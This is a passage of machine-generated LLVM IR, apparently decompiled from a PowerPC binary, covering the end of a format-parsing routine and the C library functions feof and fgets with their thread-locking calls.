  %v1_1001b2f4 = call i32 @__asm_rlwinm(i32 %v0_1001b2f4, i32 30, i32 31, i32 31)
  %not.v2_1001b2f8 = icmp eq i32 %v1_1001b2f4, 0
  %v6_1001b2fc = sext i1 %not.v2_1001b2f8 to i32
  store i32 %v6_1001b2fc, i32* %r9.global-to-local, align 4
  %v1_1001b300 = call i32 @__asm_rlwinm(i32 %v1_1001b258, i32 0, i32 20, i32 23)
  store i32 %v1_1001b300, i32* %r0.global-to-local, align 4
  %v1_1001b304 = call i32 @__asm_rlwinm(i32 %v6_1001b2fc, i32 0, i32 0, i32 27)
  store i32 %v1_1001b304, i32* %r9.global-to-local, align 4
  %v0_1001b308 = load i32, i32* @r30, align 4
  %v1_1001b308 = inttoptr i32 %v0_1001b308 to i8*
  %v2_1001b308 = load i8, i8* %v1_1001b308, align 1
  %v3_1001b308 = zext i8 %v2_1001b308 to i32
  store i32 %v3_1001b308, i32* @r10, align 4
  %v0_1001b30c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001b30c = call i32 @__asm_rlwinm(i32 %v0_1001b30c, i32 0, i32 30, i32 28)
  %v1_1001b310 = add i32 %v1_1001b304, 48
  store i32 %v1_1001b310, i32* %r9.global-to-local, align 4
  %v2_1001b314 = or i32 %v1_1001b30c, %v1_1001b300
  store i32 %v2_1001b314, i32* @r11, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1001b31c = load i32, i32* @r10, align 4
  %v1_1001b31c = load i32, i32* @r28, align 4
  %v2_1001b31c = add i32 %v1_1001b31c, 12
  %v3_1001b31c = inttoptr i32 %v2_1001b31c to i32*
  store i32 %v0_1001b31c, i32* %v3_1001b31c, align 4
  %v0_1001b320 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001b320 = load i32, i32* @r28, align 4
  %v2_1001b320 = add i32 %v1_1001b320, 4
  %v3_1001b320 = inttoptr i32 %v2_1001b320 to i32*
  store i32 %v0_1001b320, i32* %v3_1001b320, align 4
  %v0_1001b324 = load i32, i32* @r31, align 4
  %v1_1001b324 = load i32, i32* @r28, align 4
  %v2_1001b324 = add i32 %v1_1001b324, 8
  %v3_1001b324 = inttoptr i32 %v2_1001b324 to i32*
  store i32 %v0_1001b324, i32* %v3_1001b324, align 4
  %v0_1001b328 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001b328 = load i32, i32* @r28, align 4
  %v2_1001b328 = add i32 %v1_1001b328, 20
  %v3_1001b328 = inttoptr i32 %v2_1001b328 to i32*
  store i32 %v0_1001b328, i32* %v3_1001b328, align 4
  %v0_1001b32c = load i32, i32* @r11, align 4
  %v1_1001b32c = load i32, i32* @r28, align 4
  %v2_1001b32c = add i32 %v1_1001b32c, 16
  %v3_1001b32c = inttoptr i32 %v2_1001b32c to i32*
  store i32 %v0_1001b32c, i32* %v3_1001b32c, align 4
  %v0_1001b330 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001b330 = load i32, i32* @r28, align 4
  %v2_1001b330 = add i32 %v1_1001b330, 28
  %v3_1001b330 = inttoptr i32 %v2_1001b330 to i32*
  store i32 %v0_1001b330, i32* %v3_1001b330, align 4
  %v0_1001b334 = load i32, i32* @r8, align 4
  %v1_1001b334 = inttoptr i32 %v0_1001b334 to i8*
  %v2_1001b334 = load i8, i8* %v1_1001b334, align 1
  %v3_1001b334 = zext i8 %v2_1001b334 to i32
  store i32 %v3_1001b334, i32* %r9.global-to-local, align 4
  %v3_1001b338 = icmp eq i8 %v2_1001b334, 0
  br i1 %v3_1001b338, label %dec_label_pc_1001b340, label %dec_label_pc_1001b358

dec_label_pc_1001b340:                            ; preds = %dec_label_pc_1001b2f0
  %v0_1001b340 = load i32, i32* @r30, align 4
  %v1_1001b340 = inttoptr i32 %v0_1001b340 to i8*
  %v2_1001b340 = load i8, i8* %v1_1001b340, align 1
  %v3_1001b340 = zext i8 %v2_1001b340 to i32
  store i32 %v3_1001b340, i32* %r0.global-to-local, align 4
  %v3_1001b344 = icmp eq i8 %v2_1001b340, 109
  br i1 %v3_1001b344, label %dec_label_pc_1001b34c, label %dec_label_pc_1001b490

dec_label_pc_1001b34c:                            ; preds = %dec_label_pc_1001b340
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1001b350 = load i32, i32* @r28, align 4
  %v2_1001b350 = add i32 %v1_1001b350, 28
  %v3_1001b350 = inttoptr i32 %v2_1001b350 to i32*
  store i32 %v3_1001b334, i32* %v3_1001b350, align 4
  %v0_1001b354 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001b354 = load i32, i32* @r28, align 4
  %v2_1001b354 = add i32 %v1_1001b354, 32
  %v3_1001b354 = inttoptr i32 %v2_1001b354 to i32*
  store i32 %v0_1001b354, i32* %v3_1001b354, align 4
  br label %dec_label_pc_1001b358

dec_label_pc_1001b358:                            ; preds = %dec_label_pc_1001b2f0, %dec_label_pc_1001b34c
  %v0_1001b358 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1001b358, 1
  br i1 %tmp62, label %dec_label_pc_1001b434, label %dec_label_pc_1001b360

dec_label_pc_1001b360:                            ; preds = %dec_label_pc_1001b358
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1001b364

dec_label_pc_1001b364:                            ; preds = %dec_label_pc_1001b41c, %dec_label_pc_1001b360
  %v0_1001b38c = phi i32 [ 0, %dec_label_pc_1001b360 ], [ %v1_1001b420, %dec_label_pc_1001b41c ]
  %v2_1001b364 = icmp sgt i32 %v0_1001b38c, 2
  br i1 %v2_1001b364, label %dec_label_pc_1001b388, label %dec_label_pc_1001b36c

dec_label_pc_1001b36c:                            ; preds = %dec_label_pc_1001b364
  %v1_1001b36c = mul i32 %v0_1001b38c, 4
  store i32 %v1_1001b36c, i32* %r0.global-to-local, align 4
  %v0_1001b370 = load i32, i32* @r1, align 4
  %v2_1001b370 = add i32 %v0_1001b370, %v1_1001b36c
  store i32 %v2_1001b370, i32* %r9.global-to-local, align 4
  %v1_1001b374 = add i32 %v2_1001b370, 20
  %v2_1001b374 = inttoptr i32 %v1_1001b374 to i32*
  %v3_1001b374 = load i32, i32* %v2_1001b374, align 4
  store i32 %v3_1001b374, i32* %r0.global-to-local, align 4
  %v1_1001b378 = load i32, i32* @r28, align 4
  %v2_1001b378 = add i32 %v1_1001b378, %v0_1001b38c
  store i32 %v2_1001b378, i32* %r9.global-to-local, align 4
  %v1_1001b37c = urem i32 %v3_1001b374, 256
  store i32 %v1_1001b37c, i32* @r11, align 4
  %v1_1001b380 = trunc i32 %v3_1001b374 to i8
  %v3_1001b380 = add i32 %v2_1001b378, 36
  %v4_1001b380 = inttoptr i32 %v3_1001b380 to i8*
  store i8 %v1_1001b380, i8* %v4_1001b380, align 1
  %v0_1001b394.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001b394

dec_label_pc_1001b388:                            ; preds = %dec_label_pc_1001b364
  %v2_1001b38c = add i32 %v0_1001b38c, %stack_var_-84.3
  store i32 %v2_1001b38c, i32* %r9.global-to-local, align 4
  %v1_1001b390 = add i32 %v2_1001b38c, -2
  store i32 %v1_1001b390, i32* @r11, align 4
  br label %dec_label_pc_1001b394

dec_label_pc_1001b394:                            ; preds = %dec_label_pc_1001b36c, %dec_label_pc_1001b388
  %v0_1001b3b4 = phi i32 [ %v0_1001b394.pre, %dec_label_pc_1001b36c ], [ %v1_1001b390, %dec_label_pc_1001b388 ]
  %v1_1001b394 = load i32, i32* @r26, align 4
  %v3_1001b394 = icmp sgt i32 %v0_1001b3b4, %v1_1001b394
  br i1 %v3_1001b394, label %dec_label_pc_1001b39c, label %dec_label_pc_1001b3a8

dec_label_pc_1001b39c:                            ; preds = %dec_label_pc_1001b394
  %v2_1001b39c = icmp sgt i32 %v0_1001b3b4, 9
  br i1 %v2_1001b39c, label %dec_label_pc_1001b490, label %dec_label_pc_1001b3a4

dec_label_pc_1001b3a4:                            ; preds = %dec_label_pc_1001b39c
  store i32 %v0_1001b3b4, i32* @r26, align 4
  br label %dec_label_pc_1001b3a8

dec_label_pc_1001b3a8:                            ; preds = %dec_label_pc_1001b394, %dec_label_pc_1001b3a4
  store i32 %v2_1001b044.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1001b3ac = load i32, i32* @r27, align 4
  %v1_1001b3ac = mul i32 %v0_1001b3ac, 4
  store i32 %v1_1001b3ac, i32* %r0.global-to-local, align 4
  %v2_1001b3b0 = add i32 %v1_1001b3ac, %v2_1001b044.pre-phi
  %v3_1001b3b0 = inttoptr i32 %v2_1001b3b0 to i32*
  %v4_1001b3b0 = load i32, i32* %v3_1001b3b0, align 4
  store i32 %v4_1001b3b0, i32* @r31, align 4
  %v1_1001b3b4 = add i32 %v0_1001b3b4, -1
  store i32 %v1_1001b3b4, i32* @r25, align 4
  %v1_1001b3b8 = mul i32 %v1_1001b3b4, 4
  %v3_1001b3bc = icmp eq i32 %v4_1001b3b0, 8
  %v1_1001b3c0 = load i32, i32* @r28, align 4
  %v2_1001b3c0 = add i32 %v1_1001b3c0, %v1_1001b3b8
  store i32 %v2_1001b3c0, i32* %r9.global-to-local, align 4
  %v1_1001b3c4 = add i32 %v2_1001b3c0, 40
  %v2_1001b3c4 = inttoptr i32 %v1_1001b3c4 to i32*
  %v3_1001b3c4 = load i32, i32* %v2_1001b3c4, align 4
  store i32 %v3_1001b3c4, i32* %r3.global-to-local, align 4
  br i1 %v3_1001b3bc, label %dec_label_pc_1001b41c, label %dec_label_pc_1001b3cc

dec_label_pc_1001b3cc:                            ; preds = %dec_label_pc_1001b3a8
  %v3_1001b3cc = icmp eq i32 %v3_1001b3c4, 8
  br i1 %v3_1001b3cc, label %dec_label_pc_1001b404, label %dec_label_pc_1001b3d4

dec_label_pc_1001b3d4:                            ; preds = %dec_label_pc_1001b3cc
  %v4_1001b3d4 = icmp eq i32 %v3_1001b3c4, %v4_1001b3b0
  br i1 %v4_1001b3d4, label %dec_label_pc_1001b404, label %dec_label_pc_1001b3dc

dec_label_pc_1001b3dc:                            ; preds = %dec_label_pc_1001b3d4
  %v1_1001b3dc = call i32 @_promoted_size(i32 %v3_1001b3c4)
  store i32 %v1_1001b3dc, i32* @r29, align 4
  %v0_1001b3e4 = load i32, i32* @r31, align 4
  store i32 %v0_1001b3e4, i32* %r3.global-to-local, align 4
  %v1_1001b3e8 = call i32 @_promoted_size(i32 %v0_1001b3e4)
  store i32 %v1_1001b3e8, i32* %r3.global-to-local, align 4
  %v0_1001b3f4 = call i32 @__asm_mfcr()
  store i32 %v0_1001b3f4, i32* %r3.global-to-local, align 4
  store i32 %v0_1001b3f4, i32* %r0.global-to-local, align 4
  %v1_1001b3f8 = call i32 @__asm_rlwinm(i32 %v0_1001b3f4, i32 31, i32 31, i32 31)
  store i32 %v1_1001b3f8, i32* %r0.global-to-local, align 4
  %v3_1001b3fc = icmp eq i32 %v1_1001b3f8, 0
  br i1 %v3_1001b3fc, label %dec_label_pc_1001b41c, label %dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge

dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge: ; preds = %dec_label_pc_1001b3dc
  %v0_1001b408.pre = load i32, i32* @r27, align 4
  %v0_1001b410.pre = load i32, i32* @r25, align 4
  %v1_1001b414.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b404

dec_label_pc_1001b404:                            ; preds = %dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge, %dec_label_pc_1001b3d4, %dec_label_pc_1001b3cc
  %v1_1001b414 = phi i32 [ %v1_1001b414.pre, %dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge ], [ %v1_1001b3c0, %dec_label_pc_1001b3d4 ], [ %v1_1001b3c0, %dec_label_pc_1001b3cc ]
  %v0_1001b410 = phi i32 [ %v0_1001b410.pre, %dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge ], [ %v1_1001b3b4, %dec_label_pc_1001b3d4 ], [ %v1_1001b3b4, %dec_label_pc_1001b3cc ]
  %v0_1001b408 = phi i32 [ %v0_1001b408.pre, %dec_label_pc_1001b3dc.dec_label_pc_1001b404_crit_edge ], [ %v0_1001b3ac, %dec_label_pc_1001b3d4 ], [ %v0_1001b3ac, %dec_label_pc_1001b3cc ]
  store i32 %v2_1001b044.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1001b408 = mul i32 %v0_1001b408, 4
  store i32 %v1_1001b408, i32* %r0.global-to-local, align 4
  %v2_1001b40c = add i32 %v1_1001b408, %v2_1001b044.pre-phi
  %v3_1001b40c = inttoptr i32 %v2_1001b40c to i32*
  %v4_1001b40c = load i32, i32* %v3_1001b40c, align 4
  store i32 %v4_1001b40c, i32* %r0.global-to-local, align 4
  %v1_1001b410 = mul i32 %v0_1001b410, 4
  %v2_1001b414 = add i32 %v1_1001b410, %v1_1001b414
  store i32 %v2_1001b414, i32* %r9.global-to-local, align 4
  %v2_1001b418 = add i32 %v2_1001b414, 40
  %v3_1001b418 = inttoptr i32 %v2_1001b418 to i32*
  store i32 %v4_1001b40c, i32* %v3_1001b418, align 4
  br label %dec_label_pc_1001b41c

dec_label_pc_1001b41c:                            ; preds = %dec_label_pc_1001b3dc, %dec_label_pc_1001b3a8, %dec_label_pc_1001b404
  %v0_1001b41c = load i32, i32* @r28, align 4
  %v1_1001b41c = add i32 %v0_1001b41c, 28
  %v2_1001b41c = inttoptr i32 %v1_1001b41c to i32*
  %v3_1001b41c = load i32, i32* %v2_1001b41c, align 4
  %v0_1001b420 = load i32, i32* @r27, align 4
  %v1_1001b420 = add i32 %v0_1001b420, 1
  store i32 %v1_1001b420, i32* @r27, align 4
  %v1_1001b424 = add i32 %v3_1001b41c, 2
  store i32 %v1_1001b424, i32* %r9.global-to-local, align 4
  %v2_1001b428 = icmp slt i32 %v1_1001b420, %v1_1001b424
  br i1 %v2_1001b428, label %dec_label_pc_1001b364, label %dec_label_pc_1001b44c

dec_label_pc_1001b434:                            ; preds = %dec_label_pc_1001b358
  %v0_1001b434 = load i32, i32* @r28, align 4
  %v1_1001b434 = add i32 %v0_1001b434, 28
  %v2_1001b434 = inttoptr i32 %v1_1001b434 to i32*
  %v3_1001b434 = load i32, i32* %v2_1001b434, align 4
  store i32 %v3_1001b434, i32* %r5.global-to-local, align 4
  %v1_1001b438 = add i32 %v0_1001b434, 40
  store i32 %v1_1001b438, i32* @r3, align 4
  %v0_1001b43c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001b43c = trunc i32 %v0_1001b43c to i8
  %v3_1001b43c = add i32 %v0_1001b434, 38
  %v4_1001b43c = inttoptr i32 %v3_1001b43c to i8*
  store i8 %v1_1001b43c, i8* %v4_1001b43c, align 1
  %v2_1001b440 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1001b440, i32* @r4, align 4
  %v0_1001b444 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b444 = mul i32 %v0_1001b444, 4
  store i32 %v1_1001b444, i32* @r5, align 4
  store i32 268547148, i32* @lr, align 4
  %v0_1001b448 = call i32 @memcpy()
  store i32 %v0_1001b448, i32* %r3.global-to-local, align 4
  %v0_1001b44c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b44c

dec_label_pc_1001b44c:                            ; preds = %dec_label_pc_1001b41c, %dec_label_pc_1001b434
  %v0_1001b44c = phi i32 [ %v0_1001b44c.pre, %dec_label_pc_1001b434 ], [ %v0_1001b41c, %dec_label_pc_1001b41c ]
  %v1_1001b44c = add i32 %v0_1001b44c, 16
  %v2_1001b44c = inttoptr i32 %v1_1001b44c to i32*
  %v3_1001b44c = load i32, i32* %v2_1001b44c, align 4
  store i32 %v3_1001b44c, i32* %r0.global-to-local, align 4
  %v0_1001b450 = load i32, i32* @r26, align 4
  %v2_1001b450 = add i32 %v0_1001b44c, 24
  %v3_1001b450 = inttoptr i32 %v2_1001b450 to i32*
  store i32 %v0_1001b450, i32* %v3_1001b450, align 4
  %v0_1001b454 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001b454 = and i32 %v0_1001b454, 128
  store i32 %v1_1001b454, i32* %r9.global-to-local, align 4
  %v3_1001b454 = icmp eq i32 %v1_1001b454, 0
  br i1 %v3_1001b454, label %dec_label_pc_1001b45c, label %dec_label_pc_1001b468

dec_label_pc_1001b45c:                            ; preds = %dec_label_pc_1001b44c
  %v0_1001b45c = load i32, i32* @r30, align 4
  %v1_1001b45c = add i32 %v0_1001b45c, 1
  store i32 %v1_1001b45c, i32* %r0.global-to-local, align 4
  %v1_1001b460 = load i32, i32* @r28, align 4
  %v2_1001b460 = inttoptr i32 %v1_1001b460 to i32*
  store i32 %v1_1001b45c, i32* %v2_1001b460, align 4
  br label %dec_label_pc_1001b480

dec_label_pc_1001b468:                            ; preds = %dec_label_pc_1001b44c
  %v2_1001b468 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1001b468, i32* %r0.global-to-local, align 4
  %v0_1001b46c = load i32, i32* @r28, align 4
  %v1_1001b46c = inttoptr i32 %v0_1001b46c to i32*
  %v2_1001b46c = load i32, i32* %v1_1001b46c, align 4
  %v1_1001b470 = load i32, i32* @r30, align 4
  %v2_1001b470 = sub i32 %v1_1001b470, %v2_1001b468
  %v1_1001b474 = mul i32 %v2_1001b470, 4
  store i32 %v1_1001b474, i32* %r0.global-to-local, align 4
  %v2_1001b478 = add i32 %v1_1001b474, %v2_1001b46c
  store i32 %v2_1001b478, i32* %r9.global-to-local, align 4
  store i32 %v2_1001b478, i32* %v1_1001b46c, align 4
  br label %dec_label_pc_1001b480

dec_label_pc_1001b480:                            ; preds = %dec_label_pc_1001b45c, %dec_label_pc_1001b468
  %v0_1001b480 = load i32, i32* @r28, align 4
  %v1_1001b480 = add i32 %v0_1001b480, 28
  %v2_1001b480 = inttoptr i32 %v1_1001b480 to i32*
  %v3_1001b480 = load i32, i32* %v2_1001b480, align 4
  store i32 %v3_1001b480, i32* %r9.global-to-local, align 4
  %v1_1001b484 = add i32 %v3_1001b480, 2
  br label %dec_label_pc_1001b490

dec_label_pc_1001b490:                            ; preds = %dec_label_pc_1001aff4, %dec_label_pc_1001b0c8, %dec_label_pc_1001b1a4, %dec_label_pc_1001b198, %dec_label_pc_1001b1c0, %dec_label_pc_1001b0fc, %dec_label_pc_1001b39c, %dec_label_pc_1001b24c, %dec_label_pc_1001b340, %dec_label_pc_1001b480
  %storemerge2 = phi i32 [ %v1_1001b484, %dec_label_pc_1001b480 ], [ -1, %dec_label_pc_1001b340 ], [ -1, %dec_label_pc_1001b24c ], [ -1, %dec_label_pc_1001b39c ], [ -1, %dec_label_pc_1001b0fc ], [ -1, %dec_label_pc_1001b1c0 ], [ -1, %dec_label_pc_1001b198 ], [ -1, %dec_label_pc_1001b1a4 ], [ -1, %dec_label_pc_1001b0c8 ], [ -1, %dec_label_pc_1001aff4 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1001af8c, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1001b474, { 1, 0 }
  uselistorder i32 %v0_1001b44c, { 1, 0 }
  uselistorder i32 %v1_1001b420, { 1, 2, 0 }
  uselistorder i32 %v1_1001b408, { 1, 0 }
  uselistorder i32 %v0_1001b3f4, { 0, 2, 1 }
  uselistorder i32 %v3_1001b3c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1001b3c0, { 1, 2, 0 }
  uselistorder i32 %v1_1001b3b4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001b3ac, { 1, 0 }
  uselistorder i32 %v0_1001b3ac, { 1, 2, 0 }
  uselistorder i32 %v3_1001b374, { 1, 0, 2 }
  uselistorder i32 %v1_1001b36c, { 1, 0 }
  uselistorder i32 %v0_1001b38c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001b2e4, { 1, 2, 0 }
  uselistorder i32 %v1_1001b2bc, { 1, 0 }
  uselistorder i32 %v1_1001b2a8, { 0, 2, 1 }
  uselistorder i32 %v1_1001b28c, { 1, 0, 2 }
  uselistorder i32 %v1_1001b258, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1001b214, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001b1d8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1001b1c4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1001b134, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1001b130, { 1, 0 }
  uselistorder i32 %v0_1001b148, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1001b0ac, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1001b0a4, { 1, 0 }
  uselistorder i32 %v1_1001b094, { 1, 0 }
  uselistorder i32 %v3_1001b08c, { 1, 0, 2 }
  uselistorder i32 %v0_1001b108, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1001b0d8, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1001b068, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1001b050, { 1, 0 }
  uselistorder i32 %v2_1001b044.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1001b024, { 1, 0 }
  uselistorder i32 %v1_1001b00c, { 1, 2, 0 }
  uselistorder i32 %v0_1001b000, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 0, 2, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1002e46c.1174 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1002e42c.1173 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b490, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1001b480, { 1, 0 }
  uselistorder label %dec_label_pc_1001b44c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b41c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b3a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001b394, { 1, 0 }
  uselistorder label %dec_label_pc_1001b358, { 1, 0 }
  uselistorder label %dec_label_pc_1001b2a0, { 1, 0 }
  uselistorder label %dec_label_pc_1001b24c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1001b1d0, { 1, 0 }
  uselistorder label %dec_label_pc_1001b184, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b180, { 1, 0 }
  uselistorder label %dec_label_pc_1001b0f4, { 1, 0 }
  uselistorder label %dec_label_pc_1001b0ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b08c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b088, { 1, 0 }
  uselistorder label %dec_label_pc_1001b074, { 1, 0 }
  uselistorder label %dec_label_pc_1001b054, { 1, 0 }
  uselistorder label %dec_label_pc_1001b050, { 1, 0 }
  uselistorder label %dec_label_pc_1001b034, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001b4ac = call i32 @__asm_mfcr()
  %v2_1001b4b8 = add i32 %v0_1001b4ac, 56
  store i32 %v2_1001b4b8, i32* %r30.global-to-local, align 4
  %v2_1001b4d0 = add i32 %v0_1001b4ac, 52
  %v3_1001b4d0 = inttoptr i32 %v2_1001b4d0 to i32*
  %v4_1001b4d0 = load i32, i32* %v3_1001b4d0, align 4
  %v3_1001b4d8 = icmp eq i32 %v4_1001b4d0, 0
  store i1 %v3_1001b4d8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1001b4d8, label %dec_label_pc_1001b4ec, label %dec_label_pc_1001b4ec.thread

dec_label_pc_1001b4ec.thread:                     ; preds = %entry
  %v1_1001b4f43 = inttoptr i32 %v0_1001b4ac to i16*
  %v2_1001b4f44 = load i16, i16* %v1_1001b4f43, align 2
  %v3_1001b4f45 = zext i16 %v2_1001b4f44 to i32
  br label %dec_label_pc_1001b500

dec_label_pc_1001b4ec:                            ; preds = %entry
  %v2_1001b4d4 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001b4e0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v2_1001b4b8)
  %v0_1001b4e4 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001b4ec.1179 to i32), i32* @lr, align 4
  %v1_1001b4e8 = call i32 @pthread_mutex_lock(i32 %v0_1001b4e4)
  %v0_1001b4f4.pre = load i32, i32* @r31, align 4
  %v0_1001b4f8.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1001b4d4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001b4f4 = inttoptr i32 %v0_1001b4f4.pre to i16*
  %v2_1001b4f4 = load i16, i16* %v1_1001b4f4, align 2
  %v3_1001b4f4 = zext i16 %v2_1001b4f4 to i32
  br i1 %v0_1001b4f8.pre, label %dec_label_pc_1001b4fc, label %dec_label_pc_1001b500

dec_label_pc_1001b4fc:                            ; preds = %dec_label_pc_1001b4ec
  store i32 268547328, i32* @lr, align 4
  %v0_1001b4fc = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b500

dec_label_pc_1001b500:                            ; preds = %dec_label_pc_1001b4ec.thread, %dec_label_pc_1001b4ec, %dec_label_pc_1001b4fc
  %v3_1001b4f46 = phi i32 [ %v3_1001b4f45, %dec_label_pc_1001b4ec.thread ], [ %v3_1001b4f4, %dec_label_pc_1001b4ec ], [ %v3_1001b4f4, %dec_label_pc_1001b4fc ]
  %v1_1001b504 = call i32 @__asm_rlwinm(i32 %v3_1001b4f46, i32 0, i32 29, i32 29)
  %v1_1001b514 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001b4ac)
  ret i32 %v1_1001b504

; uselistorder directives
  uselistorder i32 %v0_1001b4ac, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001b500, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001b528 = call i32 @__asm_mfcr()
  %v1_1001b530 = add i32 %arg3, 56
  store i32 %v1_1001b530, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_1001b528, i32* %r28.global-to-local, align 4
  %v1_1001b54c = add i32 %arg3, 52
  %v2_1001b54c = inttoptr i32 %v1_1001b54c to i32*
  %v3_1001b54c = load i32, i32* %v2_1001b54c, align 4
  %v2_1001b550 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001b55c = icmp eq i32 %v3_1001b54c, 0
  store i1 %v3_1001b55c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1001b55c, label %dec_label_pc_1001b564, label %dec_label_pc_1001b570

dec_label_pc_1001b564:                            ; preds = %entry
  %v4_1001b564 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v1_1001b530)
  %v0_1001b568 = load i32, i32* %r29.global-to-local, align 4
  store i32 268547440, i32* @lr, align 4
  %v1_1001b56c = call i32 @pthread_mutex_lock(i32 %v0_1001b568)
  %v0_1001b570.pre = load i32, i32* @r30, align 4
  %v0_1001b574.pre = load i32, i32* @r31, align 4
  %v0_1001b578.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001b570

dec_label_pc_1001b570:                            ; preds = %entry, %dec_label_pc_1001b564
  %v0_1001b578 = phi i32 [ %v0_1001b528, %entry ], [ %v0_1001b578.pre, %dec_label_pc_1001b564 ]
  %v0_1001b574 = phi i32 [ %arg3, %entry ], [ %v0_1001b574.pre, %dec_label_pc_1001b564 ]
  %v0_1001b570 = phi i32 [ %arg2, %entry ], [ %v0_1001b570.pre, %dec_label_pc_1001b564 ]
  store i32 268547456, i32* @lr, align 4
  %v3_1001b57c = inttoptr i32 %v0_1001b578 to i8*
  %v4_1001b57c = call i32 @__GI_fgets_unlocked(i8* %v3_1001b57c, i32 %v0_1001b570, i32 %v0_1001b574)
  store i32 1, i32* @r4, align 4
